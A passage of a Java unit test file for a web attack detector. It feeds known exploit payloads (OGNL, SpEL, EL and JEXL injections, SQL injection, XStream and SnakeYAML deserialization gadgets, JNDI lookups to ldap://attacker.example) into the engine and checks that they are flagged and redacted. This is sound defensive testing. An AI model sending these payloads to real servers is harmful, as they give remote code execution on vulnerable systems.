    var encodedExpression =
        "exec(java.lang.Runtime.getRuntime()%2C%27touch%20%2Ftmp%2Fsuccess1%27)";
    var context =
        new RequestContext(
            "GET",
            "/geoserver/wfs",
            "service=WFS&version=2.0.0&request=GetPropertyValue&typeNames=sf:archsites"
                + "&valueReference="
                + encodedExpression,
            Map.of(
                "service",
                List.of("WFS"),
                "version",
                List.of("2.0.0"),
                "request",
                List.of("GetPropertyValue"),
                "typeNames",
                List.of("sf:archsites"),
                "valueReference",
                List.of(expression)),
            Map.of("user-agent", "JUnit"));

    var result = engine.detectRequest(context);

    assertAlgorithm(result, "request_expression_parameter");
    assertEquals("valueReference", result.orElseThrow().details().get("parameter"));
    assertEquals("xpath", result.orElseThrow().details().get("engine"));
    assertEquals(
        String.valueOf(expression.length()), result.orElseThrow().details().get("expressionLength"));
    assertEquals(
        List.of("[redacted]"), result.orElseThrow().request().parameters().get("valueReference"));
    assertTrue(result.orElseThrow().request().query().contains("valueReference=[redacted]"));
    assertTrue(!result.orElseThrow().request().query().contains("java.lang.Runtime"));
  }

  @Test
  void detectsGeoServerCve202325157OgcCqlFilterSqlInjection() {
    var filter =
        "strStartsWith(name,'x'') = true and 1=(SELECT CAST ((SELECT version()) AS integer))"
            + " -- ') = true";
    var encodedFilter =
        "strStartsWith%28name%2C%27x%27%27%29+%3D+true+and+1%3D%28SELECT+CAST+%28%28SELECT+version%28%29%29+AS+integer%29%29+--+%27%29+%3D+true";
    var context =
        new RequestContext(
            "GET",
            "/geoserver/ows",
            "service=wfs&version=1.0.0&request=GetFeature&typeName=vulhub:example&CQL_FILTER="
                + encodedFilter,
            Map.of(
                "service",
                List.of("wfs"),
                "version",
                List.of("1.0.0"),
                "request",
                List.of("GetFeature"),
                "typeName",
                List.of("vulhub:example"),
                "CQL_FILTER",
                List.of(filter)),
            Map.of("user-agent", "JUnit"));

    var result = engine.detectRequest(context);

    assertAlgorithm(result, "request_ogc_filter_sql_injection");
    assertEquals("CQL_FILTER", result.orElseThrow().details().get("parameter"));
    assertEquals(String.valueOf(filter.length()), result.orElseThrow().details().get("valueLength"));
    assertEquals(List.of("[redacted]"), result.orElseThrow().request().parameters().get("CQL_FILTER"));
    assertTrue(result.orElseThrow().request().query().contains("CQL_FILTER=[redacted]"));
    assertTrue(!result.orElseThrow().request().query().contains("SELECT"));
  }

  @Test
  void ignoresBenignGeoserverOgcCqlFilter() {
    var filter = "strStartsWith(name,'x') = true and population > 10";
    var context =
        new RequestContext(
            "GET",
            "/geoserver/ows",
            "service=wfs&request=GetFeature&CQL_FILTER=strStartsWith%28name%2C%27x%27%29",
            Map.of(
                "service",
                List.of("wfs"),
                "request",
                List.of("GetFeature"),
                "CQL_FILTER",
                List.of(filter)),
            Map.of("user-agent", "JUnit"));

    assertTrue(engine.detectRequest(context).isEmpty());
  }

  @Test
  void ignoresOgcCqlFilterSqlInjectionOutsideOgcContext() {
    var filter =
        "strStartsWith(name,'x'') = true and 1=(SELECT CAST ((SELECT version()) AS integer))"
            + " -- ') = true";
    var context =
        new RequestContext(
            "GET",
            "/api/search",
            "CQL_FILTER=1",
            Map.of("CQL_FILTER", List.of(filter)),
            Map.of("user-agent", "JUnit"));

    assertTrue(engine.detectRequest(context).isEmpty());
  }

  @Test
  void detectsGeoServerCve202436401WfsValueReferenceXmlBodyExpressionParameter() {
    var expression = "exec(java.lang.Runtime.getRuntime(),'touch /tmp/success2')";
    var body =
        """
        <wfs:GetPropertyValue service="WFS" version="2.0.0"
         xmlns:wfs="http://www.opengis.net/wfs/2.0">
          <wfs:Query typeNames="sf:archsites"/>
          <wfs:valueReference>%s</wfs:valueReference>
        </wfs:GetPropertyValue>
        """
            .formatted(expression);
    var context =
        new RequestContext(
            "POST",
            "/geoserver/wfs",
            "",
            Map.of(),
            Map.of("user-agent", "JUnit", "content-type", "application/xml"),
            body);

    var result = engine.detectRequest(context);

    assertAlgorithm(result, "request_expression_parameter");
    assertEquals("body.valueReference", result.orElseThrow().details().get("parameter"));
    assertEquals("xpath", result.orElseThrow().details().get("engine"));
    assertEquals(
        String.valueOf(expression.length()), result.orElseThrow().details().get("expressionLength"));
  }

  @Test
  void ignoresBenignGeoserverWfsPropertyNameExpressionParameter() {
    var context =
        new RequestContext(
            "GET",
            "/geoserver/wfs",
            "service=WFS&request=GetPropertyValue&typeNames=sf:archsites&valueReference=name",
            Map.of(
                "service",
                List.of("WFS"),
                "request",
                List.of("GetPropertyValue"),
                "typeNames",
                List.of("sf:archsites"),
                "valueReference",
                List.of("name")),
            Map.of("user-agent", "JUnit"));

    assertTrue(engine.detectRequest(context).isEmpty());
  }

  @Test
  void ignoresXPathExpressionParameterOutsideOgcContext() {
    var expression = "exec(java.lang.Runtime.getRuntime(),'touch /tmp/success1')";
    var context =
        new RequestContext(
            "GET",
            "/api/search",
            "valueReference=exec(java.lang.Runtime.getRuntime()%2C%27touch%20%2Ftmp%2Fsuccess1%27)",
            Map.of("valueReference", List.of(expression)),
            Map.of("user-agent", "JUnit"));

    assertTrue(engine.detectRequest(context).isEmpty());
  }

  @Test
  void detectsConfluenceDelegatedOgnlExpressionParameter() {
    var label =
        "\\u0027+#request\\u005b\\u0027.KEY_velocity.struts2.context\\u0027\\u005d"
            + ".internalGet(\\u0027ognl\\u0027).findValue(#parameters.x,{})+\\u0027";
    var delegated =
        "@org.apache.struts2.ServletActionContext@getResponse().setHeader('X-Cmd-Response',"
            + "(new freemarker.template.utility.Execute()).exec({\"id\"}))";
    var context =
        new RequestContext(
            "POST",
            "/template/aui/text-inline.vm",
            "label=" + label + "&x=" + delegated,
            Map.of("label", List.of(label), "x", List.of(delegated)),
            Map.of("user-agent", "JUnit", "content-type", "application/x-www-form-urlencoded"));

    var result = engine.detectRequest(context);

    assertAlgorithm(result, "request_expression_parameter");
    assertEquals("label", result.orElseThrow().details().get("parameter"));
    assertEquals("ognl", result.orElseThrow().details().get("engine"));
    assertEquals(
        String.valueOf(label.length()), result.orElseThrow().details().get("expressionLength"));
    assertEquals(List.of("[redacted]"), result.orElseThrow().request().parameters().get("label"));
    assertEquals(List.of("[redacted]"), result.orElseThrow().request().parameters().get("x"));
    assertEquals("label=[redacted]&x=[redacted]", result.orElseThrow().request().query());
  }

  @Test
  void detectsConfluenceWebworkUnicodeQueryStringExpressionParameter() {
    var expression =
        "\\u0027+{Class.forName(\\u0027javax.script.ScriptEngineManager\\u0027)"
            + ".newInstance().getEngineByName(\\u0027JavaScript\\u0027).\\u0065val"
            + "(\\u0027var p = new java.lang.ProcessBuilder(\\u0022bash\\u0022,"
            + "\\u0022-c\\u0022,\\u0022id\\u0022);p.start()\\u0027)}+\\u0027";
    var context =
        new RequestContext(
            "POST",
            "/pages/doenterpagevariables.action",
            "queryString=" + expression,
            Map.of("queryString", List.of(expression)),
            Map.of("user-agent", "JUnit", "content-type", "application/x-www-form-urlencoded"));

    var result = engine.detectRequest(context);

    assertAlgorithm(result, "request_expression_parameter");
    assertEquals("queryString", result.orElseThrow().details().get("parameter"));
    assertEquals("expression", result.orElseThrow().details().get("engine"));
    assertEquals(
        String.valueOf(expression.length()), result.orElseThrow().details().get("expressionLength"));
    assertEquals(
        List.of("[redacted]"), result.orElseThrow().request().parameters().get("queryString"));
    assertEquals("queryString=[redacted]", result.orElseThrow().request().query());
  }

  @Test
  void ignoresBenignDelegatedOgnlExpressionParameter() {
    var label =
        "'+#request['.KEY_velocity.struts2.context'].internalGet('ognl')"
            + ".findValue(#parameters.x,{})+'";
    var context =
        new RequestContext(
            "POST",
            "/template/aui/text-inline.vm",
            "label=" + label + "&x=profile.displayName",
            Map.of("label", List.of(label), "x", List.of("profile.displayName")),
            Map.of("user-agent", "JUnit", "content-type", "application/x-www-form-urlencoded"));

    assertTrue(engine.detectRequest(context).isEmpty());
  }

  @Test
  void ignoresStandaloneDelegatedTemplateCommandWithoutOgnlBridge() {
    var delegated =
        "@org.apache.struts2.ServletActionContext@getResponse().setHeader('X-Cmd-Response',"
            + "(new freemarker.template.utility.Execute()).exec({\"id\"}))";
    var context =
        new RequestContext(
            "POST",
            "/template/aui/text-inline.vm",
            "x=" + delegated,
            Map.of("x", List.of(delegated)),
            Map.of("user-agent", "JUnit", "content-type", "application/x-www-form-urlencoded"));

    assertTrue(engine.detectRequest(context).isEmpty());
  }

  @Test
  void detectsOauthResponseTypeExpressionParameter() {
    var expression = "${T(java.lang.Runtime).getRuntime().exec('id')}";
    var encodedExpression = "%24%7BT(java.lang.Runtime).getRuntime().exec(%27id%27)%7D";
    var context =
        new RequestContext(
            "GET",
            "/oauth/authorize",
            "response_type=" + encodedExpression
                + "&client_id=acme&scope=openid&redirect_uri=http%3A%2F%2Ftest",
            Map.of(
                "response_type",
                List.of(expression),
                "client_id",
                List.of("acme"),
                "scope",
                List.of("openid"),
                "redirect_uri",
                List.of("http://test")),
            Map.of("user-agent", "JUnit"));

    var result = engine.detectRequest(context);

    assertAlgorithm(result, "request_expression_parameter");
    assertEquals("response_type", result.orElseThrow().details().get("parameter"));
    assertEquals("spel", result.orElseThrow().details().get("engine"));
    assertEquals(
        String.valueOf(expression.length()), result.orElseThrow().details().get("expressionLength"));
    assertEquals(
        List.of("[redacted]"), result.orElseThrow().request().parameters().get("response_type"));
    assertTrue(result.orElseThrow().request().query().contains("response_type=[redacted]"));
    assertTrue(!result.orElseThrow().request().query().contains("java.lang.Runtime"));
  }

  @Test
  void detectsNexusCve202010204ExtDirectRoleExpressionBody() {
    var expression =
        "nxadmin$\\A{''.getClass().forName('java.lang.Runtime').getMethods()[6]"
            + ".invoke(null).exec('touch /tmp/success')}";
    var body =
        "{\"action\":\"coreui_User\",\"method\":\"update\",\"data\":[{\"roles\":[\""
            + jsonString(expression)
            + "\"]}],\"type\":\"rpc\"}";
    var context =
        new RequestContext(
            "POST",
            "/service/extdirect",
            "",
            Map.of(),
            Map.of("user-agent", "JUnit", "content-type", "application/json"),
            body);

    var result = engine.detectRequest(context);

    assertAlgorithm(result, "request_expression_parameter");
    assertEquals("body.roles", result.orElseThrow().details().get("parameter"));
    assertEquals("el", result.orElseThrow().details().get("engine"));
    assertEquals(
        String.valueOf(expression.length()), result.orElseThrow().details().get("expressionLength"));
  }

  @Test
  void detectsNexusCve202010199RepositoryMemberExpressionBody() {
    var expression =
        "$\\A{''.getClass().forName('java.lang.Runtime').getMethods()[6]"
            + ".invoke(null).exec('touch /tmp/success')}";
    var body = "{\"group\":{\"memberNames\":[\"" + jsonString(expression) + "\"]}}";
    var context =
        new RequestContext(
            "POST",
            "/service/rest/beta/repositories/go/group",
            "",
            Map.of(),
            Map.of("user-agent", "JUnit", "content-type", "application/json"),
            body);

    var result = engine.detectRequest(context);

    assertAlgorithm(result, "request_expression_parameter");
    assertEquals("body.memberNames", result.orElseThrow().details().get("parameter"));
    assertEquals("el", result.orElseThrow().details().get("engine"));
    assertEquals(
        String.valueOf(expression.length()), result.orElseThrow().details().get("expressionLength"));
  }

  @Test
  void detectsNexusCve20197238ExtDirectJexlFilterExpressionBody() {
    var expression =
        "233.class.forName('java.lang.Runtime').getRuntime().exec('touch /tmp/success')";
    var body =
        "{\"action\":\"coreui_Component\",\"method\":\"previewAssets\",\"data\":[{\"page\":1,"
            + "\"start\":0,\"limit\":50,\"sort\":[{\"property\":\"name\",\"direction\":\"ASC\"}],"
            + "\"filter\":[{\"property\":\"repositoryName\",\"value\":\"*\"},"
            + "{\"property\":\"expression\",\"value\":\""
            + jsonString(expression)
            + "\"},{\"property\":\"type\",\"value\":\"jexl\"}]}],\"type\":\"rpc\",\"tid\":8}";
    var context =
        new RequestContext(
            "POST",
            "/service/extdirect",
            "",
            Map.of(),
            Map.of("user-agent", "JUnit", "content-type", "application/json"),
            body);

    var result = engine.detectRequest(context);

    assertAlgorithm(result, "request_expression_parameter");
    assertEquals("body.value", result.orElseThrow().details().get("parameter"));
    assertEquals("jexl", result.orElseThrow().details().get("engine"));
    assertEquals(
        String.valueOf(expression.length()), result.orElseThrow().details().get("expressionLength"));
  }

  @Test
  void detectsStrutsFreemarkerExecuteOgnlParameter() {
    var expression =
        "%{(#instancemanager=#application[\"org.apache.tomcat.InstanceManager\"])"
            + ".(#execute=#instancemanager.newInstance(\"freemarker.template.utility.Execute\"))"
            + ".(#arglist=#instancemanager.newInstance(\"java.util.ArrayList\"))"
            + ".(#arglist.add(\"id\"))"
            + ".(#execute.exec(#arglist))}";
    var context =
        new RequestContext(
            "POST",
            "/index.action",
            "id=" + expression,
            Map.of("id", List.of(expression)),
            Map.of("user-agent", "JUnit", "content-type", "multipart/form-data"));

    var result = engine.detectRequest(context);

    assertAlgorithm(result, "request_expression_parameter");
    assertEquals("id", result.orElseThrow().details().get("parameter"));
    assertEquals("ognl", result.orElseThrow().details().get("engine"));
    assertEquals(
        String.valueOf(expression.length()), result.orElseThrow().details().get("expressionLength"));
  }

  @Test
  void detectsJsonPatchExpressionPath() {
    var expression =
        "T(java.lang.Runtime).getRuntime().exec(new java.lang.String(new byte[]{105,100}))"
            + "/lastname";
    var body = "[{\"op\":\"replace\",\"path\":\"" + expression + "\",\"value\":\"vulhub\"}]";
    var context =
        new RequestContext(
            "PATCH",
            "/customers/1",
            "",
            Map.of(),
            Map.of("user-agent", "JUnit", "content-type", "application/json-patch+json"),
            body);

    var result = engine.detectRequest(context);

    assertAlgorithm(result, "request_json_patch_expression");
    assertEquals("path", result.orElseThrow().details().get("field"));
    assertEquals("spel", result.orElseThrow().details().get("engine"));
    assertEquals(
        String.valueOf(expression.length()), result.orElseThrow().details().get("expressionLength"));
    assertEquals(String.valueOf(body.length()), result.orElseThrow().details().get("bodyLength"));
  }

  @Test
  void detectsSpringCve20178046JsonPatchByteArrayCommandPath() {
    var expression =
        "T(java.lang.Runtime).getRuntime().exec(new java.lang.String(new byte[]{116,111,117,99,104,32,47,116,109,112,47,115,117,99,99,101,115,115}))"
            + "/lastname";
    var body = "[{\"op\":\"replace\",\"path\":\"" + expression + "\",\"value\":\"vulhub\"}]";
    var context =
        new RequestContext(
            "PATCH",
            "/customers/1",
            "",
            Map.of(),
            Map.of("user-agent", "JUnit", "content-type", "application/json-patch+json"),
            body);

    var result = engine.detectRequest(context);

    assertAlgorithm(result, "request_json_patch_expression");
    assertEquals("path", result.orElseThrow().details().get("field"));
    assertEquals("spel", result.orElseThrow().details().get("engine"));
    assertEquals(
        String.valueOf(expression.length()), result.orElseThrow().details().get("expressionLength"));
    assertEquals(String.valueOf(body.length()), result.orElseThrow().details().get("bodyLength"));
  }

  @Test
  void ignoresBenignExpressionParameter() {
    var context =
        new RequestContext(
            "GET",
            "/ajax/example5.action",
            "name=%{profile.displayName}",
            Map.of("name", List.of("%{profile.displayName}")),
            Map.of("user-agent", "JUnit"));

    assertTrue(engine.detectRequest(context).isEmpty());
  }

  @Test
  void ignoresBenignJsonPatchPath() {
    var context =
        new RequestContext(
            "PATCH",
            "/customers/1",
            "",
            Map.of(),
            Map.of("user-agent", "JUnit", "content-type", "application/json-patch+json"),
            "[{\"op\":\"replace\",\"path\":\"/lastname\",\"value\":\"vulhub\"}]");

    assertTrue(engine.detectRequest(context).isEmpty());
  }

  @Test
  void ignoresNexusJsonMathExpressionWithoutRuntime() {
    var expression = "$\\B{233*233}";
    var body =
        "{\"action\":\"coreui_User\",\"method\":\"update\",\"data\":[{\"roles\":[\""
            + jsonString(expression)
            + "\"]}],\"type\":\"rpc\"}";
    var context =
        new RequestContext(
            "POST",
            "/service/extdirect",
            "",
            Map.of(),
            Map.of("user-agent", "JUnit", "content-type", "application/json"),
            body);

    assertTrue(engine.detectRequest(context).isEmpty());
  }

  @Test
  void ignoresNexusExtDirectJexlFilterWithoutRuntime() {
    var expression = "asset.name == 'example.jar'";
    var body =
        "{\"action\":\"coreui_Component\",\"method\":\"previewAssets\",\"data\":[{\"filter\":["
            + "{\"property\":\"expression\",\"value\":\""
            + jsonString(expression)
            + "\"},{\"property\":\"type\",\"value\":\"jexl\"}]}],\"type\":\"rpc\",\"tid\":8}";
    var context =
        new RequestContext(
            "POST",
            "/service/extdirect",
            "",
            Map.of(),
            Map.of("user-agent", "JUnit", "content-type", "application/json"),
            body);

    assertTrue(engine.detectRequest(context).isEmpty());
  }

  @Test
  void ignoresRuntimeExpressionBodyOutsideControlContext() {
    var expression =
        "$\\A{''.getClass().forName('java.lang.Runtime').getMethods()[6]"
            + ".invoke(null).exec('id')}";
    var body = "{\"roles\":[\"" + jsonString(expression) + "\"]}";
    var context =
        new RequestContext(
            "POST",
            "/api/notes",
            "",
            Map.of(),
            Map.of("user-agent", "JUnit", "content-type", "application/json"),
            body);

    assertTrue(engine.detectRequest(context).isEmpty());
  }

  @Test
  void ignoresBenignOauthResponseTypeExpressionParameter() {
    var context =
        new RequestContext(
            "GET",
            "/oauth/authorize",
            "response_type=%24%7B233*233%7D&client_id=acme&scope=openid&redirect_uri=http%3A%2F%2Ftest",
            Map.of(
                "response_type",
                List.of("${233*233}"),
                "client_id",
                List.of("acme"),
                "scope",
                List.of("openid"),
                "redirect_uri",
                List.of("http://test")),
            Map.of("user-agent", "JUnit"));

    assertTrue(engine.detectRequest(context).isEmpty());
  }

  @Test
  void detectsRequestExpressionParameterName() {
    var expressionName =
        "username[#this.getClass().forName(\"java.lang.Runtime\")"
            + ".getRuntime().exec(\"touch /tmp/success\")]";
    var encodedName =
        "username%5B%23this.getClass().forName(%22java.lang.Runtime%22)"
            + ".getRuntime().exec(%22touch%20%2Ftmp%2Fsuccess%22)%5D";
    var context =
        new RequestContext(
            "POST",
            "/users",
            encodedName + "=&password=&repeatedPassword=",
            Map.of(
                expressionName,
                List.of(""),
                "password",
                List.of(""),
                "repeatedPassword",
                List.of("")),
            Map.of("user-agent", "JUnit", "content-type", "application/x-www-form-urlencoded"));

    var result = engine.detectRequest(context);

    assertAlgorithm(result, "request_expression_parameter_name");
    assertEquals("username", result.orElseThrow().details().get("parameter"));
    assertEquals("spel", result.orElseThrow().details().get("engine"));
    assertEquals(
        String.valueOf(expressionName.length()),
        result.orElseThrow().details().get("expressionLength"));
    assertTrue(result.orElseThrow().request().parameters().containsKey("username[redacted]"));
    assertTrue(!result.orElseThrow().request().parameters().containsKey(expressionName));
    assertTrue(result.orElseThrow().request().query().contains("username[redacted]=[redacted]"));
    assertTrue(!result.orElseThrow().request().query().contains("java.lang.Runtime"));
  }

  @Test
  void detectsStrutsRedirectExpressionParameterName() {
    var expressionName = "redirect:${#a=@java.lang.Runtime@getRuntime().exec('id')}";
    var encodedName =
        "redirect:%24%7B%23a%3D%40java.lang.Runtime%40getRuntime%28%29.exec%28%27id%27%29%7D";
    var context =
        new RequestContext(
            "GET",
            "/index.action",
            encodedName + "=1",
            Map.of(expressionName, List.of("1")),
            Map.of("user-agent", "JUnit"));

    var result = engine.detectRequest(context);

    assertAlgorithm(result, "request_expression_parameter_name");
    assertEquals("redirect", result.orElseThrow().details().get("parameter"));
    assertEquals("ognl", result.orElseThrow().details().get("engine"));
    assertEquals(
        String.valueOf(expressionName.length()),
        result.orElseThrow().details().get("expressionLength"));
  }

  @Test
  void detectsStrutsDynamicMethodInvocationExpressionParameterName() {
    var expressionName =
        "method:#_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,"
            + "#a=@java.lang.Runtime@getRuntime().exec(#parameters.cmd[0])";
    var encodedName =
        "method:%23_memberAccess%3D%40ognl.OgnlContext%40DEFAULT_MEMBER_ACCESS,"
            + "%23a%3D%40java.lang.Runtime%40getRuntime%28%29.exec%28%23parameters.cmd%5B0%5D%29";
    var context =
        new RequestContext(
            "GET",
            "/index.action",
            encodedName + "=1&cmd=id",
            Map.of(expressionName, List.of("1"), "cmd", List.of("id")),
            Map.of("user-agent", "JUnit"));

    var result = engine.detectRequest(context);

    assertAlgorithm(result, "request_expression_parameter_name");
    assertEquals("method", result.orElseThrow().details().get("parameter"));
    assertEquals("ognl", result.orElseThrow().details().get("engine"));
    assertEquals(
        String.valueOf(expressionName.length()),
        result.orElseThrow().details().get("expressionLength"));
  }

  @Test
  void detectsSpringBindingExpressionParameterName() {
    var expressionName = "_(new java.lang.ProcessBuilder(\"bash\",\"-c\",\"id\")).start()";
    var encodedName =
        "%5F%28new%20java.lang.ProcessBuilder%28%22bash%22%2C%22-c%22%2C%22id%22%29%29.start%28%29";
    var context =
        new RequestContext(
            "POST",
            "/hotels/booking",
            encodedName + "=vulhub",
            Map.of(expressionName, List.of("vulhub")),
            Map.of("user-agent", "JUnit", "content-type", "application/x-www-form-urlencoded"));

    var result = engine.detectRequest(context);

    assertAlgorithm(result, "request_expression_parameter_name");
    assertEquals("_", result.orElseThrow().details().get("parameter"));
    assertEquals("spel", result.orElseThrow().details().get("engine"));
    assertEquals(
        String.valueOf(expressionName.length()),
        result.orElseThrow().details().get("expressionLength"));
    assertEquals(List.of("vulhub"), result.orElseThrow().request().parameters().get("_[redacted]"));
    assertTrue(!result.orElseThrow().request().parameters().containsKey(expressionName));
    assertEquals("_[redacted]=[redacted]", result.orElseThrow().request().query());
  }

  @Test
  void ignoresBenignExpressionParameterName() {
    var context =
        new RequestContext(
            "POST",
            "/users",
            "username%5Baddress%5D=main&note=%25%7Bprofile.displayName%7D",
            Map.of(
                "username[address]",
                List.of("main"),
                "note",
                List.of("%{profile.displayName}")),
            Map.of("user-agent", "JUnit", "content-type", "application/x-www-form-urlencoded"));

    assertTrue(engine.detectRequest(context).isEmpty());
  }

  @Test
  void ignoresBenignSpringBindingParameterName() {
    var context =
        new RequestContext(
            "POST",
            "/hotels/booking",
            "_%28new%20java.lang.String%28%22guest%22%29%29.toString%28%29=vulhub",
            Map.of("_(new java.lang.String(\"guest\")).toString()", List.of("vulhub")),
            Map.of("user-agent", "JUnit", "content-type", "application/x-www-form-urlencoded"));

    assertTrue(engine.detectRequest(context).isEmpty());
  }

  @Test
  void detectsRequestExpressionPath() {
    var decodedPath =
        "/${(#a=@org.apache.commons.io.IOUtils@toString("
            + "@java.lang.Runtime@getRuntime().exec(\"id\").getInputStream(),\"utf-8\"))"
            + ".(@com.opensymphony.webwork.ServletActionContext@getResponse()"
            + ".setHeader(\"X-Cmd-Response\",#a))}/";
    var encodedPath =
        "/%24%7B%28%23a%3D%40org.apache.commons.io.IOUtils%40toString%28"
            + "%40java.lang.Runtime%40getRuntime%28%29.exec%28%22id%22%29.getInputStream%28%29%2C%22utf-8%22%29%29."
            + "%28%40com.opensymphony.webwork.ServletActionContext%40getResponse%28%29.setHeader%28%22X-Cmd-Response%22%2C%23a%29%29%7D/";
    var context =
        new RequestContext(
            "GET",
            encodedPath,
            "",
            Map.of(),
            Map.of("user-agent", "JUnit"));

    var result = engine.detectRequest(context);

    assertAlgorithm(result, "request_expression_path");
    assertEquals("ognl", result.orElseThrow().details().get("engine"));
    assertEquals(
        String.valueOf(encodedPath.length()), result.orElseThrow().details().get("expressionLength"));
    assertEquals("/[redacted]", result.orElseThrow().request().uri());
    assertEquals("/[redacted]", result.orElseThrow().details().get("uri"));
  }

  @Test
  void ignoresBenignExpressionPath() {
    var context =
        new RequestContext(
            "GET",
            "/struts2-showcase/$%7B233*233%7D/actionChain1.action",
            "",
            Map.of(),
            Map.of("user-agent", "JUnit"));

    assertTrue(engine.detectRequest(context).isEmpty());
  }

  @Test
  void detectsTypedParameterDeserialization() {
    String parameter = "+defaultData:com.mchange.v2.c3p0.WrapperConnectionPoolDataSource";
    String value =
        "{\"userOverridesAsString\":\"HexAsciiSerializedMap:aced00057372003d636f6d2e6d6368\"}";
    var context =
        new RequestContext(
            "POST",
            "/api/jsonws/invoke",
            "cmd=%7B%22%2Fexpandocolumn%2Fadd-column%22%3A%7B%7D%7D"
                + "&%2BdefaultData:com.mchange.v2.c3p0.WrapperConnectionPoolDataSource="
                + "%7B%22userOverridesAsString%22%3A%22HexAsciiSerializedMap%3Aaced00057372003d636f6d2e6d6368%22%7D",
            Map.of(
                "cmd",
                List.of("{\"/expandocolumn/add-column\":{}}"),
                parameter,
                List.of(value)),
            Map.of(
                "content-type",
                "application/x-www-form-urlencoded",
                "user-agent",
                "JUnit"));

    var result = engine.detectRequest(context);

    assertAlgorithm(result, "request_typed_parameter_deserialization");
    assertEquals("+defaultData", result.orElseThrow().details().get("parameter"));
    assertEquals(
        "com.mchange.v2.c3p0.WrapperConnectionPoolDataSource",
        result.orElseThrow().details().get("class"));
    assertEquals(String.valueOf(value.length()), result.orElseThrow().details().get("valueLength"));
    assertEquals(List.of("[redacted]"), result.orElseThrow().request().parameters().get(parameter));
    assertTrue(result.orElseThrow().request().query().contains("%2BdefaultData:"));
    assertTrue(result.orElseThrow().request().query().contains("=[redacted]"));
    assertTrue(!result.orElseThrow().request().query().contains("HexAsciiSerializedMap"));
  }

  @Test
  void ignoresBenignTypedParameter() {
    var context =
        new RequestContext(
            "POST",
            "/api/jsonws/invoke",
            "%2BdefaultData:com.example.portal.SafeColumn=%7B%22name%22%3A%22display%22%7D",
            Map.of("+defaultData:com.example.portal.SafeColumn", List.of("{\"name\":\"display\"}")),
            Map.of(
                "content-type",
                "application/x-www-form-urlencoded",
                "user-agent",
                "JUnit"));

    assertTrue(engine.detectRequest(context).isEmpty());
  }

  @Test
  void detectsWddxTypedPayloadJndiDeserialization() {
    var payload =
        "<wddxPacket version='1.0'><header/><data><struct type='xcom.sun.rowset.JdbcRowSetImplx'>"
            + "<var name='dataSourceName'><string>ldap://attacker.example/Exploit</string></var>"
            + "<var name='autoCommit'><boolean value='true'/></var></struct></data></wddxPacket>";
    var context =
        new RequestContext(
            "POST",
            "/CFIDE/adminapi/accessmanager.cfc",
            "method=foo&_cfclient=true&argumentCollection=" + payload,
            Map.of("argumentCollection", List.of(payload)),
            Map.of(
                "content-type",
                "application/x-www-form-urlencoded",
                "user-agent",
                "JUnit"));

    var result = engine.detectRequest(context);

    assertAlgorithm(result, "request_typed_payload_deserialization");
    assertEquals("parameter", result.orElseThrow().details().get("source"));
    assertEquals("argumentCollection", result.orElseThrow().details().get("parameter"));
    assertEquals("com.sun.rowset.JdbcRowSetImpl", result.orElseThrow().details().get("class"));
    assertEquals("jndi:ldap", result.orElseThrow().details().get("trigger"));
    assertEquals(String.valueOf(payload.length()), result.orElseThrow().details().get("valueLength"));
    assertEquals(
        List.of("[redacted]"),
        result.orElseThrow().request().parameters().get("argumentCollection"));
    assertTrue(result.orElseThrow().request().query().contains("argumentCollection=[redacted]"));
    assertFalse(result.orElseThrow().request().query().contains("JdbcRowSetImpl"));
    assertFalse(result.orElseThrow().request().query().contains("ldap://"));
  }

  @Test
  void detectsHertzBeatCve202442323SnakeYamlImportTypedPayload() {
    var payload =
        """
        !!org.h2.jdbc.JdbcConnection [ "jdbc:h2:mem:test;MODE=MSSQLServer;INIT=drop alias if exists exec\\;CREATE ALIAS EXEC AS $$void exec() throws java.io.IOException { Runtime.getRuntime().exec(\\"touch /tmp/success\\")\\; }$$\\;CALL EXEC ()\\;", [], "a", "b", false ]
        """;
    var context =
        new RequestContext(
            "POST",
            "/api/monitors/import",
            "",
            Map.of(),
            Map.of("content-type", "application/x-yaml", "user-agent", "JUnit"),
            payload);

    var result = engine.detectRequest(context);

    assertAlgorithm(result, "request_typed_payload_deserialization");
    assertEquals("body", result.orElseThrow().details().get("source"));
    assertEquals("body", result.orElseThrow().details().get("parameter"));
    assertEquals("org.h2.jdbc.JdbcConnection", result.orElseThrow().details().get("class"));
    assertEquals("jdbc-h2-init", result.orElseThrow().details().get("trigger"));
    assertEquals(String.valueOf(payload.length()), result.orElseThrow().details().get("valueLength"));
    assertEquals("", result.orElseThrow().request().body());
  }

  @Test
  void detectsXmlPolymorphicProcessBuilderGadgetPayload() {
    var payload =
        """
        <map>
          <entry>
            <jdk.nashorn.internal.objects.NativeString>
              <value class="com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data">
                <dataHandler>
                  <dataSource class="com.sun.xml.internal.ws.encoding.xml.XMLMessage$XmlDataSource">
                    <is class="javax.crypto.CipherInputStream">
                      <cipher class="javax.crypto.NullCipher">
                        <serviceIterator class="javax.imageio.spi.FilterIterator">
                          <next class="java.lang.ProcessBuilder">
                            <command>
                              <string>touch</string>
                              <string>/tmp/success</string>
                            </command>
                          </next>
                        </serviceIterator>
                      </cipher>
                    </is>
                  </dataSource>
                </dataHandler>
              </value>
            </jdk.nashorn.internal.objects.NativeString>
          </entry>
        </map>
        """;
    var context =
        new RequestContext(
            "POST",
            "/orders/3/edit",
            "",
            Map.of(),
            Map.of("content-type", "application/xml", "user-agent", "JUnit"),
            payload);

    var result = engine.detectRequest(context);

    assertAlgorithm(result, "request_xml_polymorphic_gadget");
    assertEquals("java.lang.ProcessBuilder", result.orElseThrow().details().get("class"));
    assertEquals("xml-class-attribute", result.orElseThrow().details().get("source"));
    assertEquals(String.valueOf(payload.length()), result.orElseThrow().details().get("bodyLength"));
    assertTrue(result.orElseThrow().request().body().isBlank());
  }

  @Test
  void detectsXstreamJdbcRowSetJndiXmlPayload() {
    var payload =
        """
        <sorted-set>
          <javax.naming.ldap.Rdn_-RdnEntry>
            <type>ysomap</type>
            <value class="com.sun.org.apache.xpath.internal.objects.XRTreeFrag">
              <m__DTMXRTreeFrag>
                <m__dtm class="com.sun.org.apache.xml.internal.dtm.ref.sax2dtm.SAX2DTM">
                  <m__incrementalSAXSource class="com.sun.org.apache.xml.internal.dtm.ref.IncrementalSAXSource_Xerces">
                    <fPullParserConfig class="com.sun.rowset.JdbcRowSetImpl" serialization="custom">
                      <javax.sql.rowset.BaseRowSet>
                        <default>
                          <dataSource>ldap://java-chains.example:50389/x</dataSource>
                        </default>
                      </javax.sql.rowset.BaseRowSet>
                    </fPullParserConfig>
                  </m__incrementalSAXSource>
                </m__dtm>
